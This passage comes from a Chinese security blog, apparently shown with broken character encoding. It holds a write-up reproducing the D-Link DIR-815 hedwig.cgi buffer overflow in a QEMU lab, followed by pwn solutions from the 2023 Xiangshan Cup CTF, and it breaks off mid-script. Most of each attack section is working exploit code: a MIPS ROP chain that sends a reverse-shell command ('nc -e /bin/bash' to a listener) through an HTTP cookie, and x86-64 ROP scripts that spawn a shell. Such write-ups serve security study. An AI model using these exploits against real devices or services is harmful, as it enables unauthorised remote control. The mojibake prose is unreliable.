ç­‰</p><p>ç°åœ¨æµæ°´çº¿çº§æ•°è¶Šæ¥è¶Šæ·±ï¼Œæ™®éé‡‡ç”¨åˆ†æ”¯é¢„æµ‹æŠ€æœ¯<a href="https://www.zhihu.com/question/546825692">2</a>ï¼Œä½†ä¸ºäº†è½¯ä»¶ä¸Šçš„å…¼å®¹æ€§ MIPS å’Œ SPARC è¿˜æ˜¯ä½œäº†ä¿ç•™</p><p>MIPS CPUå¤§éƒ¨åˆ†é‡‡ç”¨æŒ‡ä»¤å’Œæ•°æ®å„è‡ªæ‹¥æœ‰ä¸€ä¸ªç‹¬ç«‹çš„cacheçš„æ–¹æ¡ˆicacheå’Œdcacheï¼Œç¼“å­˜æ»¡äº†æ‰ä¼šflushï¼Œå°†æ•°æ®å†™å›åˆ°ä¸»å­˜ï¼ŒMIPSæ¶æ„é»˜è®¤æ²¡æœ‰æ‰“å¼€å †æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤(NX)ï¼Œå¸¸è§çš„å°±æ˜¯ret2shellcodeï¼Œç›´æ¥ret2shellcodeä¼šæ‰§è¡Œæœªå†™å…¥shellcodeçš„å†…å­˜ä½ç½®</p><p>ä¸ºäº†å†™å›shellcodeå¹¶ä½¿icacheå¤±æ•ˆï¼Œret2shellcodeä¹‹å‰ä¸€èˆ¬è°ƒç”¨å µå¡å‡½æ•°sleepï¼Œå¤„ç†å™¨ä¼šè¿›ç¨‹è°ƒåº¦åˆ‡æ¢ä¸Šä¸‹æ–‡ï¼Œç¼“å­˜ä¼šè‡ªåŠ¨flush</p><h2 id="qemuç³»ç»Ÿçº§æ¨¡æ‹Ÿ"><a href="#qemuç³»ç»Ÿçº§æ¨¡æ‹Ÿ" class="headerlink" title="qemuç³»ç»Ÿçº§æ¨¡æ‹Ÿ"></a>qemuç³»ç»Ÿçº§æ¨¡æ‹Ÿ</h2><p><a href="https://people.debian.org/~aurel32/qemu/">https://people.debian.org/~aurel32/qemu/</a> ä¸‹è½½å¥½mipsæ–‡ä»¶ç³»ç»Ÿå’Œå†…æ ¸é•œåƒ</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">-M malta \</span><br><span class="line">-kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">-hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">-append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> \</span><br><span class="line">-net nic \</span><br><span class="line">-net tap \</span><br><span class="line">-nographic \</span><br></pre></td></tr></table></figure><p>root&#x2F;rootç™»å…¥</p><h3 id="ç½‘ç»œé…ç½®"><a href="#ç½‘ç»œé…ç½®" class="headerlink" title="ç½‘ç»œé…ç½®"></a>ç½‘ç»œé…ç½®</h3><p><strong>å®¿ä¸»æœºç½‘ç»œé…ç½®</strong>:ä¾èµ–åº“<code>sudo apt-get install bridge-utils uml-utilities</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0<span class="comment">#è®¾ç½®tap0è™šæ‹Ÿç½‘å¡çš„IPåœ°å€åŠå­ç½‘æ©ç </span></span><br></pre></td></tr></table></figure><p><img src="/2023/10/22/first-router/image-20231027091950064.png" alt="image-20231027091950064"></p><p><strong>qemuæ¨¡æ‹Ÿæœºç½‘ç»œé…ç½®</strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ï¼/bin/sh</span></span><br><span class="line">ifconfig eth0 192.168.100.2 netmask 255.255.255.0</span><br><span class="line">route add default gw 192.168.100.254</span><br></pre></td></tr></table></figure><p><img src="/2023/10/22/first-router/image-20231027091815775.png" alt="image-20231027091815775"></p><p>scpä¼ æ–‡ä»¶:scp æ–‡ä»¶å ç›®æ ‡ç”¨æˆ·å@ç›®æ ‡ip:ç›®æ ‡æœºå™¨è·¯å¾„</p><h3 id="gdbserverè°ƒè¯•"><a href="#gdbserverè°ƒè¯•" class="headerlink" title="gdbserverè°ƒè¯•"></a>gdbserverè°ƒè¯•</h3><p><strong>æ¨¡æ‹Ÿæœºé‡Œ</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdbserver ./file :port </span><br></pre></td></tr></table></figure><p>æ­£å¸¸è·¯ç”±ç¯å¢ƒä¸ºäº†ç¨‹åºè¿è¡Œé€Ÿåº¦ä¼šå–æ¶ˆ canaryï¼Œåœ°å€éšæœºåŒ–ç­‰ä¿æŠ¤æœºåˆ¶ <code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p><p><strong>å®¿ä¸»æœº</strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo gdb-multiarch ./file -ex <span class="string">&quot;target remote æ¨¡æ‹Ÿæœºip:æ¨¡æ‹ŸæœºserveræŒ‡å®šç«¯å£&quot;</span></span><br></pre></td></tr></table></figure><h2 id="æ¼æ´å¤ç°-D-Link-DIR-815-è·¯ç”±å™¨å¤šæ¬¡æº¢å‡º"><a href="#æ¼æ´å¤ç°-D-Link-DIR-815-è·¯ç”±å™¨å¤šæ¬¡æº¢å‡º" class="headerlink" title="æ¼æ´å¤ç° D-Link DIR-815 è·¯ç”±å™¨å¤šæ¬¡æº¢å‡º"></a>æ¼æ´å¤ç° D-Link DIR-815 è·¯ç”±å™¨å¤šæ¬¡æº¢å‡º</h2><p>å›ºä»¶ä¸‹è½½ <a href="https://rebyte.me/en/d-link/89510/file-592084/">https://rebyte.me/en/d-link/89510/file-592084/</a></p><p>æœ€åè¿”å›å¯æ§å¯„å­˜å™¨å¾ˆå¤š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00409A28 E4 04 BF 8F                   lw      $ra, 0x4C0+var_s24($sp)</span><br><span class="line">.text:00409A2C 21 10 E0 02                   move    $v0, $s7</span><br><span class="line">.text:00409A30 E0 04 BE 8F                   lw      $fp, 0x4C0+var_s20($sp)</span><br><span class="line">.text:00409A34 DC 04 B7 8F                   lw      $s7, 0x4C0+var_s1C($sp)</span><br><span class="line">.text:00409A38 D8 04 B6 8F                   lw      $s6, 0x4C0+var_s18($sp)</span><br><span class="line">.text:00409A3C D4 04 B5 8F                   lw      $s5, 0x4C0+var_s14($sp)</span><br><span class="line">.text:00409A40 D0 04 B4 8F                   lw      $s4, 0x4C0+var_s10($sp)</span><br><span class="line">.text:00409A44 CC 04 B3 8F                   lw      $s3, 0x4C0+var_sC($sp)</span><br><span class="line">.text:00409A48 C8 04 B2 8F                   lw      $s2, 0x4C0+var_s8($sp)</span><br><span class="line">.text:00409A4C C4 04 B1 8F                   lw      $s1, 0x4C0+var_s4($sp)</span><br><span class="line">.text:00409A50 C0 04 B0 8F                   lw      $s0, 0x4C0($sp)</span><br><span class="line">.text:00409A54 08 00 E0 03                   jr      $ra</span><br><span class="line">.text:00409A58 E8 04 BD 27                   addiu   $sp, 0x4E8</span><br></pre></td></tr></table></figure><p>åŠ è½½çš„libcé‡Œå»æ‰¾äº›gadget</p><p><code>mipsrop.stackfinder()</code>å¯»æ‰¾å°†å †æ ˆåœ°å€æ”¾å…¥å¯„å­˜å™¨çš„gadget</p><p><img src="/2023/10/22/first-router/image-20231027121821119.png" alt="image-20231027121821119"></p><p>sp+0x10ç»™ä¸ºsystemå‚æ•°åœ°å€ï¼Œs0å¤„è®¾ç½®ä¸ºsystemå³å¯</p><p>systemåœ¨0x053200ä¼šè¢«00æˆªæ–­</p><p><img src="/2023/10/22/first-router/image-20231027115258429.png" alt="image-20231027115258429"></p><p>éœ€è¦æ‰¾ä¸€ä¸‹æŠŠs0å‡å°‘æˆ–è€…åŠ ä¸Šä¸€äº›æ•°çš„gadget</p><p><code>mipsrop.find(&quot;addiu $s0&quot;)</code></p><p><img src="/2023/10/22/first-router/image-20231027123224282.png" alt="image-20231027123224282"></p><p>æŠŠs5è®¾ä¸º0x159ccçš„gadgetï¼Œs0è®¾ä¸ºsystem-1 æ‰§è¡Œåå¼¹shellå³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">libcbase = <span class="number">0x77f34000</span></span><br><span class="line">system_addr_1 = <span class="number">0x53200</span>-<span class="number">1</span></span><br><span class="line">gadget1 = <span class="number">0x158c8</span></span><br><span class="line">gadget2 = <span class="number">0x159cc</span></span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.100.254 9999&#x27;</span></span><br><span class="line">padding = cyclic(<span class="number">0x3cd</span>)</span><br><span class="line">padding += p32(libcbase + system_addr_1) <span class="comment"># s0</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s1</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s2</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s3</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s4</span></span><br><span class="line">padding += p32(libcbase+gadget2)         <span class="comment"># s5</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s6</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s7</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># fp</span></span><br><span class="line">padding += p32(libcbase + gadget1)       <span class="comment"># ra</span></span><br><span class="line">padding += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">padding += cmd</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;context&quot;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(padding)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>æ¨¡æ‹Ÿæœºé‡Œç”¨ç¯å¢ƒå˜é‡æ¨¡æ‹Ÿä¼ é€’å‚æ•°</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_LENGTH=<span class="string">&quot;100&quot;</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line"><span class="built_in">export</span> HTTP_COOKIE=<span class="string">&quot;uid=`cat context`&quot;</span></span><br><span class="line"><span class="built_in">export</span> REQUEST_METHOD=<span class="string">&quot;POST&quot;</span></span><br><span class="line"><span class="built_in">export</span> REQUEST_URI=<span class="string">&quot;/hedwig.cgi&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;uid=1234&quot;</span>|./gdbserver.mipsle :1234 /htdocs/web/hedwig.cgi</span><br></pre></td></tr></table></figure><p>å®¿ä¸»æœºç›‘å¬ç«¯å£è·å¾—shell</p><p><img src="/2023/10/22/first-router/image-20231027125128566.png" alt="image-20231027125128566"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">libcbase = <span class="number">0x77f34000</span></span><br><span class="line">system_addr_1 = <span class="number">0x53200</span>-<span class="number">1</span></span><br><span class="line">gadget1 = <span class="number">0x158c8</span></span><br><span class="line">gadget2 = <span class="number">0x159cc</span></span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.100.254 9999&#x27;</span></span><br><span class="line">padding = cyclic(<span class="number">0x3cd</span>)</span><br><span class="line">padding += p32(libcbase + system_addr_1) <span class="comment"># s0</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s1</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s2</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s3</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s4</span></span><br><span class="line">padding += p32(libcbase+gadget2)         <span class="comment"># s5</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s6</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s7</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># fp</span></span><br><span class="line">padding += p32(libcbase + gadget1)       <span class="comment"># ra</span></span><br><span class="line">padding += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">padding += cmd</span><br><span class="line">url=<span class="string">&#x27;http://192.168.100.2:4321/hedwig.cgi&#x27;</span></span><br><span class="line">header = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;uid=&#x27;</span>+padding,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;100&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;6rx3r&#x27;</span>: <span class="string">&#x27;xxx&#x27;</span>&#125;</span><br><span class="line">requests.post(url=url, headers=header, data=data)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 é¦™å±±æ¯</title>
      <link href="/2023/10/15/2023xsb/"/>
      <url>/2023/10/15/2023xsb/</url>
      
        <content type="html"><![CDATA[<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1dEHXG4QZIISKDtTgL3ZqmQ">https://pan.baidu.com/s/1dEHXG4QZIISKDtTgL3ZqmQ</a><br>æå–ç ï¼šq407</p><h2 id="pwthon"><a href="#pwthon" class="headerlink" title="pwthon"></a>pwthon</h2><p>ç¬¬ä¸€æ¬¡é‡è§cpythonçš„é¢˜ï¼Œæ— å¤´è‹è‡ä¸€æ ·ä¹±æ’ï¼Œåå¤§ç‰¢</p><p>ç»™äº†app.cpython-37m-x86_64-linux-gnu.soå’Œmain.pyä¸¤ä¸ªæ–‡ä»¶</p><p>æœ€å¤§çš„é—®é¢˜å°±æ˜¯è°ƒè¯•ç¯å¢ƒ(è·‘ä¸èµ·æ¥å¯å¤ªéš¾å—äº†)ï¼Œé¢˜ç›®ç»™çš„main.pyéœ€è¦æŠŠ<code>os.mkdir(folder_name)</code>æ”¹ä¸º<code>os.makedirs(folder_name)</code></p><p>3.37çš„cpythonä¼¼ä¹(è¯•äº†å…¶ä»–ç‰ˆæœ¬éƒ½æ²¡è·‘èµ·æ¥)åªèƒ½ç”¨3.37æ‰èƒ½è·‘äº†èµ·æ¥ï¼Œpython main.pyå°±å¯ä»¥è·‘èµ·æ¥äº†</p><p>è°ƒè¯•å°±ç›´æ¥attachåˆ°pythonè¿›ç¨‹ä¸Šï¼Œpythonè¿›ç¨‹åœ°å€ç©ºé—´å¯ä»¥çœ‹åˆ°cpython.soè¢«åŠ è½½è¿›æ¥äº†</p><p><img src="/2023/10/15/2023xsb/image-20231015221314843.png" alt="image-20231015221314843"></p><p>æ¼æ´ä¸»è¦å‡ºç°åœ¨<code>_pyx_pw_3app_3app_mainçš„_pyx_f_3app_Welcome2Pwnthon</code>(å‰©ä½™ä¸¤ä¸ªå‡½æ•°çš„é•¿åº¦çœŸçš„è¦å‘½)</p><p><img src="/2023/10/15/2023xsb/image-20231015222245793.png" alt="image-20231015222245793"></p><p>çœ‹ä¸‹ä¿æŠ¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22:~/share/match/2023xsb/pwthon_34a4c98f089057330b960f4eba8ae404$ checksec ./app.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/2023xsb/pwthon_34a4c98f089057330b960f4eba8ae404/app.cpython-37m-x86_64-linux-gnu.so&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RPATH:    b&#x27;/home/xiran/anaconda3/envs/cython/lib&#x27;</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>ç™½ç»™çš„åŸºåœ°å€è¿™æ ·å°±å¯ä»¥æœ‰pop rdiè¿™æ ·çš„gadgetç”¨ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç”¨æ¥æ³„éœ²canary(ä¹Ÿå¯ä»¥æ³„éœ²libcåœ°å€ä½†æ˜¯è¿œç¨‹æ ˆç¯å¢ƒæå¯èƒ½ä¸ä¸€æ ·ï¼Œé€‰æ‹©äº†ropæ¥æ³„éœ²libcåœ°å€)ï¼Œæ ˆæº¢å‡ºæ¥ropæ¥æ³„éœ²libcåè¿”å›åˆ°_pyx_f_3app_Welcome2Pwnthonï¼Œå†æ¬¡æº¢å‡ºgetshell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">cpython_so=ELF(<span class="string">&#x27;./app.cpython-37m-x86_64-linux-gnu.so&#x27;</span>)</span><br><span class="line">io = process(argv=[<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;main.py&#x27;</span>])</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">bstr = <span class="keyword">lambda</span> x   : <span class="built_in">str</span>(x).encode()</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+<span class="built_in">hex</span>(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbpie</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+<span class="built_in">hex</span>(x)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>(<span class="params">x=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,x)</span><br><span class="line"><span class="comment">#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># b(&#x27;b __printf_chk&#x27;)</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27; gift &#x27;</span>)</span><br><span class="line">cpython_so_base=<span class="built_in">int</span>(r(<span class="built_in">len</span>(<span class="string">&quot;0x7fad184ef8b0&quot;</span>)),<span class="number">16</span>)-<span class="number">0x38b0</span>-(<span class="number">0x7f7af04ec000</span> -<span class="number">0x7f7af04e9000</span>)</span><br><span class="line">p(<span class="string">&#x27;cpython&#x27;</span>,cpython_so_base)</span><br><span class="line"><span class="comment">#0x0000000000003f8f : pop rdi ; ret</span></span><br><span class="line">poprdi=cpython_so_base+<span class="number">0x0000000000003f8f</span></span><br><span class="line">ret=<span class="number">0x000000000000301a</span>+cpython_so_base</span><br><span class="line">app_Welcome2Pwnthon=<span class="number">0x99F0</span>+cpython_so_base</span><br><span class="line">sl(<span class="string">b&#x27;%p&#x27;</span>*<span class="number">14</span>)<span class="comment">#%$pä¼šcrash</span></span><br><span class="line">x=rl()</span><br><span class="line">x=io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">canary=<span class="built_in">int</span>((x.decode()).split(<span class="string">&quot;0x&quot;</span>)[-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;canry&#x27;</span>,canary)</span><br><span class="line">pay=flat(</span><br><span class="line">    cyclic(<span class="number">0x108</span>),</span><br><span class="line">    canary,</span><br><span class="line">    <span class="number">0</span>,<span class="comment">#è¿”å›æ—¶å¤špopäº†rdx</span></span><br><span class="line">    poprdi,</span><br><span class="line">    cpython_so.got[<span class="string">&#x27;puts&#x27;</span>]+cpython_so_base,</span><br><span class="line">    cpython_so.plt[<span class="string">&#x27;puts&#x27;</span>]+cpython_so_base,</span><br><span class="line">    app_Welcome2Pwnthon    </span><br><span class="line">)</span><br><span class="line">sl(pay)</span><br><span class="line">rl()</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libcbase=puts_ad-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">sl(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">pay=flat(</span><br><span class="line">    cyclic(<span class="number">0x108</span>),</span><br><span class="line">    canary,</span><br><span class="line">    <span class="number">0</span>,<span class="comment">#è¿”å›æ—¶å¤špopäº†rdx</span></span><br><span class="line">    poprdi,</span><br><span class="line">    bin_sh_addr,</span><br><span class="line">    ret,</span><br><span class="line">    system</span><br><span class="line">)</span><br><span class="line">sl(pay)</span><br><span class="line"><span class="comment"># sl(b&#x27;cat *fl*&#x27;)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2023/10/15/2023xsb/image-20231015220838627.png" alt="image-20231015220838627"></p><h2 id="move"><a href="#move" class="headerlink" title="move"></a>move</h2><p>å¸¸è§„æ ˆè¿ç§»ï¼Œä¸è¿‡é¢˜ç›®ç»™çš„bssåœ°å€å¤ªé è¿‘ä¸Šé¢çš„åªè¯»æ®µäº†ï¼Œæ‰€ä»¥ä¸èƒ½è¿”å›_start()ï¼Œå¯ä»¥è¿”å›åˆ°main</p><p>ç¬¬äºŒæ¬¡read(0, &amp;sskd, 0x20uLL);æ­¤æ—¶æ ˆå·²ç»æ˜¯sskdé™„ä»¶äº†ï¼Œraedå¯ä»¥æ”¹æ‰readè‡ªå·±çš„è¿”å›åœ°å€è¿›è¡Œrop</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    debug = <span class="number">0</span></span><br><span class="line">    remotestr=<span class="string">&quot;&quot;</span></span><br><span class="line">    remotestr=remotestr.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io = remote(remotestr[<span class="number">0</span>],<span class="built_in">int</span>(remotestr[<span class="number">1</span>],<span class="number">10</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    debug = <span class="number">1</span></span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">bstr = <span class="keyword">lambda</span> x   : <span class="built_in">str</span>(x).encode()</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+<span class="built_in">hex</span>(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbpie</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+<span class="built_in">hex</span>(x)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>(<span class="params">x=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401350 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401352 